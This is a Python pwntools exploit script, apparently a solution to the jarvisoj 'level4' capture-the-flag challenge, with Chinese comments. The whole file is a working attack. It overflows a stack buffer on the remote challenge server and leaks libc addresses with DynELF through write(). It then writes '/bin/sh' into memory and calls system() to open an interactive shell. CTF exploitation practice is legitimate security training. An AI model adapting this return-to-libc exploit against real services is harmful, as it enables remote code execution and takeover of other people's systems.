# coding:utf-8
from pwn import *

sh = remote('pwn2.jarvisoj.com', 9880)
elf = ELF('./level4')

write_plt = elf.plt['write']
vuln_addr = elf.symbols['vulnerable_function']

# 定义leak()泄露任意函数地址
def leak(addr):
	payload = 'a' * (0x88 + 0x4) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(addr) + p32(4)
	sh.sendline(payload)
	leak_addr = sh.recv(4)
	return leak_addr

# 获取sysetem()函数地址
dynelf = DynELF(leak, elf = elf)
sys_addr = dynelf.lookup('system', 'libc')

print('system addr: ' + hex(sys_addr))

read_plt = elf.plt['read']
bss_addr = 0x804a024

# 往内存中写入shellcode
payload1 = 'a' * (0x88 + 0x4) + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(8)
sh.sendline(payload1)
sh.send('/bin/sh\x00')

# 执行system()函数get shell
payload2 = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0) + p32(bss_addr)
sh.sendline(payload2)

sh.interactive()
sh.close()